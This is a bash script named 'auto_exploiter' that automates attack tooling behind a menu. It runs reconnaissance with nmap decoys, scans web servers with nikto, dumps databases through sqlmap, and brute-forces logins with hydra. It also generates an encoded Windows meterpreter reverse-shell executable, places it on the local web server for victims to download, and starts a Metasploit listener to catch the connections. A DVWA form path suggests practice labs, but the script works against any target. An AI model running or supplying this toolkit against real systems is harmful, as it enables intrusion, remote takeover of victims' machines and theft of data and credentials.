#!/bin/bash
echo ####################
echo # auto_exploiter   #
echo # by Logan Clemons #
echo #                  #
echo ####################

function pause(){
     read -p "=$*"
}

#tool menu
echo "-----------------------------------------------------"
echo "| Choose the type of hack                           |"
echo "| [1] Reconnaissance                                |"
echo "| [2] Web_Server_Scanner                            |"
echo "| [3] Metasploit_Automator                          |"
echo "| [4] SQL_Injection                                 |"
echo "| [5] PW_Crack                                      |"
echo "| [6] Misc_Tools                                    |"
echo "-----------------------------------------------------"
read type

#Reconnaissance
if [ $type -eq 1 ]; then
  echo "---------------------"
  echo "input target website "
  echo "---------------------"
  read recon_ip

  recon_1="whatweb $recon_ip"
  recon_2="dmitry -i -e $recon_ip"
  recon_3="nmap -sT -Pn  $recon_ip -D 10.0.0.1,10.0.0.2,10.0.0.4"


  echo "Starting reconnaissance...."

  $recon_1
  echo "----------------------------------"
  $recon_2
  echo "----------------------------------"
  $recon_3
  echo "Finished!"


#web-server-scanner
else
  if [ "$type" -eq 2 ] ; then
    echo "---------------------"
    echo "input target ip"
    echo "---------------------"
    read web_ip
    echo "---------------------------"


    web_hack_1="nikto -h $web_ip"
    web_hack_2="golismero scan $web_ip"

    echo "scanning web server..."
    echo "you can enter ctrl+c if you want to skip this scan"
    $web_hack_1
    echo "----------------------------------"
    $web_hack_2
    echo "----------------------------------"
    echo "Done hacking the website, happy hacking"

#Metasploit_Automator
else
  if [ "$type" -eq 3 ] ; then

    ip=($(ifconfig eth0 | grep "inet addr" | cut -d ":" -f2 | awk '{print $1}'))
    echo -n "Enter the desired  port [ENTER]: "
    read port
    echo -n "Enter your malicious executable's name [ENTER]: "
    read name

    echo "...Generating payload "
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -e x86/shikata_ga_nai -f exe -o $name.exe

    check=($(ls | grep $name.exe))


    echo "Payload Generated "
    echo "Here is your Exe :" $check
    read -r -p "Do you want to send the payload to /var/www/html/  now ? [y/N] " response
    if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
    then
     echo "Copying payload to /var/www/html "
     cp $name.exe /var/www/html/
     echo "Copied "
     echo "Your Url :"" ""http://"$ip"/"$name".exe"
     echo "use exploit/multi/handler
     set PAYLOAD windows/meterpreter/reverse_tcp
     set LHOST" ""$ip"
     set LPORT" ""$port"
     set ExitOnSession false
     exploit -j -z" | tee listenerw.rc


     echo "Now Starting Msf multi/handler for the above !"
     msfconsole -r listenerw.rc
           # touch ~/meterpreter.rc
           # echo use exploit/multi/handler > ~/meterpreter.rc
           # echo set PAYLOAD android/meterpreter/reverse_tcp >> ~/meterpreter.rc
           # echo set LHOST $ip >> ~/meterpreter.rc
           # echo set LPORT $port >> ~/meterpreter.rc
           ## echo set ExitOnSession false >> ~/meterpreter.rc
           # echo exploit -j -z >> ~/meterpreter.rc


         else
          echo "Ok ! Tc"
        fi
        sleep 10
        echo "Finished! ! "
#SQL_Injection
else
  if [ "$type" -eq 4 ] ; then
     echo "-----------------------------------------------------"
     echo "input target url ex. "www.target.com/vuln.php?id=1" "
     echo "-----------------------------------------------------"
     read injectable_website

     # echo check dbs type ... post-sql, mysql, sql server, etc.

     sql_injection="sqlmap -u $injectable_website --dbs"
     $sql_injection

     echo "input target database (eg. users) "
     read database

     tables="sqlmap -u $injectable_website -D $database --tables"
     $tables

     echo "input target table"
     read injectable_table

     cols="sqlmap -u $injectable_website -D $database -T $injectable_table --columns"
     $cols

     echo "Input column"
     read injectable

     injectable_cols="sqlmap -u $injectable_website -D $database -T $injectable_table -C $injectable --dump"
     $injectable_cols
	
#PW_Crack
else
  if [ "$type" -eq 5 ] ; then
     echo "Enter website"
     read website

     echo "Enter path to username file (/path/to/users.txt)"
     read usernames

     echo "Enter path to password file (/path/to/pass.txt)"
     read passwords

     echo "Enter path to form (/dvwa/vulnerabilities/brute/)"
     read formpath

     echo "Enter cookie (eg. gjic8vd6pj5o1j1unbnmid58ce)"
     read cookie

     echo "Enter security level (high | medium | low)"
     read securitylvl

     hydra $website -V -L $usernames -P $passwords http-get-form "$formpath:username=^USER^&password=^PASS^&Login:F=incorrect:H=Cookie: PHPSESSID=$cookie; security=$securitylvl"
fi
fi
fi
fi
fi
